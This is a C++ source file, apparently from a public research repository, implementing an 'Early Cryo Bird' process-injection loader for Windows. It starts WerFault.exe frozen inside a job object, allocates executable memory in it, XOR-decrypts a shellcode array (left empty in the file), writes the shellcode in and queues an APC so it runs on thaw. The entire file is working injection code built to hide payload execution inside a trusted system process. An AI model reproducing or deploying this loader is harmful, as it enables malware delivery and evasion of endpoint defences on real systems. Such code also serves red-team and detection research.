// https://github.com/zero2504/Early-Cryo-Bird-Injections

#define _CRT_SECURE_NO_WARNINGS // Disable warnings for unsafe CRT functions like printf

// Define constants for job object freeze information and XOR key for decryption
#define JobObjectFreezeInformation 18
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0) // Macro to check NTSTATUS success
#define XOR_KEY 0xAA // XOR key for decrypting shellcode

#include <Windows.h>
#include <stdio.h>
#include <iostream>
#include <winternl.h> // For NT API definitions

HANDLE hJob = NULL; // Global handle for the job object

// Typedefs for NT API functions
typedef const OBJECT_ATTRIBUTES* PCOBJECT_ATTRIBUTES;

typedef NTSTATUS(NTAPI* pNtQueueApcThread)(HANDLE, PVOID, PVOID, PVOID, PVOID);
typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemoryEx)(HANDLE, PVOID*, PSIZE_T, ULONG, ULONG, PVOID, ULONG);
typedef NTSTATUS(NTAPI* pNtSetInformationJobObject)(HANDLE, JOBOBJECTINFOCLASS, PVOID, ULONG);
typedef NTSTATUS(NTAPI* pNtAssignProcessToJobObject)(HANDLE, HANDLE);
typedef NTSTATUS(NTAPI* pNtCreateJobObject)(PHANDLE, ACCESS_MASK, PCOBJECT_ATTRIBUTES);

// Load ntdll.dll and resolve NT API function addresses
HMODULE hNtDll = GetModuleHandleA("ntdll.dll");

pNtQueueApcThread NtQueueApcThread = (pNtQueueApcThread)GetProcAddress(hNtDll, "NtQueueApcThread");
pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtDll, "NtWriteVirtualMemory");
pNtAllocateVirtualMemoryEx NtAllocateVirtualMemoryEx = (pNtAllocateVirtualMemoryEx)GetProcAddress(hNtDll, "NtAllocateVirtualMemoryEx");
pNtSetInformationJobObject NtSetInformationJobObject = (pNtSetInformationJobObject)GetProcAddress(hNtDll, "NtSetInformationJobObject");
pNtAssignProcessToJobObject NtAssignProcessToJobObject = (pNtAssignProcessToJobObject)GetProcAddress(hNtDll, "NtAssignProcessToJobObject");
pNtCreateJobObject NtCreateJobObject = (pNtCreateJobObject)GetProcAddress(hNtDll, "NtCreateJobObject");

// Structures for job object freeze information
typedef struct _JOBOBJECT_WAKE_FILTER {
    ULONG HighEdgeFilter;
    ULONG LowEdgeFilter;
} JOBOBJECT_WAKE_FILTER, *PJOBOBJECT_WAKE_FILTER;

typedef struct _JOBOBJECT_FREEZE_INFORMATION {
    union {
        ULONG Flags;
        struct {
            ULONG FreezeOperation : 1; // Indicates freeze operation
            ULONG FilterOperation : 1; // Indicates filter operation
            ULONG SwapOperation : 1;   // Indicates swap operation
            ULONG Reserved : 29;       // Reserved bits
        };
    };
    BOOLEAN Freeze; // Freeze flag
    BOOLEAN Swap;   // Swap flag
    UCHAR Reserved0[2];
    JOBOBJECT_WAKE_FILTER WakeFilter; // Wake filter configuration
} JOBOBJECT_FREEZE_INFORMATION, *PJOBOBJECT_FREEZE_INFORMATION;

// Function to set console text color
void SetColor(int color) {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hConsole, color);
}

// Function to decrypt shellcode using XOR
void decrypt(unsigned char* code, int size) {
    for (int i = 0; i < size; i++) {
        code[i] ^= XOR_KEY; // XOR each byte with the key
    }
}

int main() {
    // Create a job object
    NTSTATUS creationJob = NtCreateJobObject(&hJob, STANDARD_RIGHTS_ALL | 63, NULL);
    if (!NT_SUCCESS(creationJob)) {
        SetColor(FOREGROUND_RED);
        printf("Error: 0x%X\n", creationJob);
        CloseHandle(hJob);
        return -1;
    }

    // Configure the job object for freezing processes
    JOBOBJECT_FREEZE_INFORMATION freezeInfo = { 0 };
    freezeInfo.FreezeOperation = 1; // Initiate freeze
    freezeInfo.Freeze = TRUE;

    // Apply freeze configuration to the job object
    NTSTATUS freezeStatus = NtSetInformationJobObject(hJob, (JOBOBJECTINFOCLASS)JobObjectFreezeInformation, &freezeInfo, sizeof(freezeInfo));
    if (!NT_SUCCESS(freezeStatus)) {
        SetColor(FOREGROUND_RED);
        printf("Error: 0x%X\n", freezeStatus);
        CloseHandle(hJob);
        return -1;
    }

    // Initialize extended startup information for process creation
    STARTUPINFOEXW siEx = { 0 };
    ZeroMemory(&siEx, sizeof(siEx));
    siEx.StartupInfo.cb = sizeof(siEx);

    SIZE_T attrListSize = 0;

    // Allocate memory for the attribute list
    InitializeProcThreadAttributeList(NULL, 1, 0, &attrListSize);
    siEx.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrListSize);
    if (!siEx.lpAttributeList) {
        printf("[-] Error in the attribute list allocation.\n");
        CloseHandle(hJob);
        return -1;
    }
    if (!InitializeProcThreadAttributeList(siEx.lpAttributeList, 1, 0, &attrListSize)) {
        std::cerr << "[-] Error initializing the attribute list. Error: " << GetLastError() << std::endl;
        HeapFree(GetProcessHeap(), 0, siEx.lpAttributeList);
        CloseHandle(hJob);
        return -1;
    }

    // Associate the job object with the process
    if (!UpdateProcThreadAttribute(
        siEx.lpAttributeList,
        0,
        PROC_THREAD_ATTRIBUTE_JOB_LIST,
        &hJob,
        sizeof(HANDLE),
        NULL,
        NULL))
    {
        std::cerr << "[-] Error updating the attribute list. Error: " << GetLastError() << std::endl;
        DeleteProcThreadAttributeList(siEx.lpAttributeList);
        HeapFree(GetProcessHeap(), 0, siEx.lpAttributeList);
        CloseHandle(hJob);
        return -1;
    }

    // Create a new process in the job object
    PROCESS_INFORMATION pi = { 0 };
    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcessW(
        L"C:\\Windows\\System32\\WerFault.exe", // Target process
        NULL,
        NULL,
        NULL,
        FALSE,
        EXTENDED_STARTUPINFO_PRESENT,
        NULL,
        NULL,
        &siEx.StartupInfo,
        &pi))
    {
        std::cerr << "[-] CreateProcessW failed: " << GetLastError() << std::endl;
        DeleteProcThreadAttributeList(siEx.lpAttributeList);
        HeapFree(GetProcessHeap(), 0, siEx.lpAttributeList);
        CloseHandle(hJob);
        return -1;
    }
    std::cout << "[+] Process started in Job! PID: " << pi.dwProcessId << std::endl;

    // Clean up attribute list
    DeleteProcThreadAttributeList(siEx.lpAttributeList);
    HeapFree(GetProcessHeap(), 0, siEx.lpAttributeList);

    // Define encrypted shellcode
    unsigned char myCode[] = { /* Encrypted shellcode bytes */ };

    SIZE_T sizeOfCode = sizeof(myCode);
    SIZE_T regionSize = sizeOfCode;

    PVOID remoteMemory = NULL;

    // Allocate memory in the target process
    NTSTATUS allocStatus = NtAllocateVirtualMemoryEx(pi.hProcess, &remoteMemory, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE, NULL, 0);
    if (NT_SUCCESS(allocStatus)) {
        printf("[+] NtAllocateVirtualMemoryEx allocated memory at 0x%p\n", remoteMemory);
    } else {
        printf("Error: 0x%X\n", allocStatus);
        CloseHandle(hJob);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return -1;
    }

    // Decrypt the shellcode
    decrypt(myCode, sizeOfCode);

    // Write the shellcode to the allocated memory
    NTSTATUS writeStatus = NtWriteVirtualMemory(pi.hProcess, remoteMemory, myCode, sizeOfCode, NULL);
    if (NT_SUCCESS(writeStatus)) {
        printf("[+] Shellcode was written to 0x%p\n", remoteMemory);
    } else {
        printf("Error: 0x%X\n", writeStatus);
        CloseHandle(hJob);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 1;
    }

    // Queue an APC to execute the shellcode
    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)remoteMemory;
    NTSTATUS statusAPC = NtQueueApcThread(pi.hThread, (PVOID)apcRoutine, NULL, NULL, NULL);

    if (!NT_SUCCESS(statusAPC)) {
        SetColor(FOREGROUND_RED);
        printf("\t[!] NtQueueApcThread Failed With Error : 0x%X \n", statusAPC);
        return FALSE;
    } else {
        SetColor(FOREGROUND_GREEN);
        printf("[+] NtQueueApcThread successfully queued APC\n");
    }

    // Wait for user input to unfreeze the process
    SetColor(FOREGROUND_INTENSITY);
    printf("[i] Press Enter for thawing....\n");
    getchar();

    // Unfreeze the process
    freezeInfo.FreezeOperation = 1; // Unfreeze operation
    freezeInfo.Freeze = FALSE;

    NTSTATUS unfreezeStatus = NtSetInformationJobObject(hJob, (JOBOBJECTINFOCLASS)JobObjectFreezeInformation, &freezeInfo, sizeof(freezeInfo));
    if (!NT_SUCCESS(unfreezeStatus)) {
        SetColor(FOREGROUND_RED);
        printf("Error: 0x%X\n", unfreezeStatus);
        CloseHandle(hJob);
        return -1;
    }

    SetColor(FOREGROUND_BLUE);
    printf("[!] Process thawed successfully!\n");

    // Wait for the process to finish
    WaitForSingleObject(pi.hProcess, 0xFFFFFFFF);

    // Clean up handles
    CloseHandle(hJob);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;
}